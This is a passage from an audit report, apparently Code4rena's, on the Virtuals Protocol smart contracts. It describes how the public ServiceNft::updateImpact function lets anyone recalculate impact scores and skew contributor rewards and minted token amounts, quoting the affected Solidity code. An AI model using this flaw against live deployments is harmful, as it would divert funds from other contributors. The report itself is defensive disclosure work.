href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-427\"\u003eEPSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-11\"\u003egmh5225\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-394\"\u003egregom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-598\"\u003ehecker_trieu_tien\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-505\"\u003eHeyu\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-390\"\u003eholtzzx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-575\"\u003eLeoGold\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-418\"\u003elevi_104\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-627\"\u003emaxzuvex\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-325\"\u003eoakcobalt\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-689\"\u003ePelz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-469\"\u003ePotEater\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-827\"\u003eRorschach\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-437\"\u003eshui\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-455\"\u003esoloking\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-605\"\u003eTheDonH\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L58\"\u003e\u003ccode\u003eServiceNft::mint\u003c/code\u003e\u003c/a\u003e is designed to be \u003ca href=\"https://whitepaper.virtuals.io/about-virtuals-1/the-protocol/co-contribution-and-provenance/modular-consensus-framework\"\u003ecalled via governance\u003c/a\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eContribution Process: Contributors submit their proposals through our frontend, utilizing the modular consensus framework. Each proposal generates a contribution NFT regardless of acceptance, authenticating the submission\u0026#39;s origin.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eState Finality in ICV: Accepted contributions are minted as service NFTs on-chain and assigned to the appropriate Virtual address within the ICV, validating their integration into the Virtual ecosystem.\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function calls the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90\"\u003e\u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e\u003c/a\u003e which sets up the impacts using the \u003ccode\u003edatasetImpactWeight\u003c/code\u003e variable:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetImpactWeight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;            \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// datasetImpactWeight is used\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];                     \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Affects both `proposalId` and `datasetId`\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSetServiceScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, as we can see the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90\"\u003e\u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e\u003c/a\u003e’s visibility modifier is public, allowing anyone to call it with any \u003ccode\u003evirtualId\u003c/code\u003e/\u003ccode\u003eproposalId\u003c/code\u003e. So if the admin decides to call the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L141\"\u003e\u003ccode\u003eServiceNft::setDatasetImpactWeight\u003c/code\u003e\u003c/a\u003e, there would be a cascading issue where users would simply update the impact accordingly to their own favour.\u003c/p\u003e\n\u003cp\u003eThere are financial incentives observed as well, described as follows:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L252\"\u003e\u003ccode\u003eAgentRewardV2::_distributeContributorRewards\u003c/code\u003e\u003c/a\u003e uses \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120\"\u003e\u003ccode\u003eServiceNft::getImpact\u003c/code\u003e\u003c/a\u003e call for calculating rewards; hence, allowing to gain higher rewards or provide lesser rewards to the rest.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_distributeContributorRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        RewardSettingsCheckpoints.RewardSettings \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esettings\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eservices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eservices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNftContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);           \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Uses getImpact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003econtinue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eServiceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_serviceRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardImpacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNftContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)] += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . . \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/token/Minter.sol#L134\"\u003e\u003ccode\u003eMinter::mint\u003c/code\u003e\u003c/a\u003e uses the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120\"\u003e\u003ccode\u003eServiceNft::getImpact\u003c/code\u003e\u003c/a\u003e call to transfer tokens; hence, leading to excess or lower funds being transferred.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtribution\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetDatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Uses getImpact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan 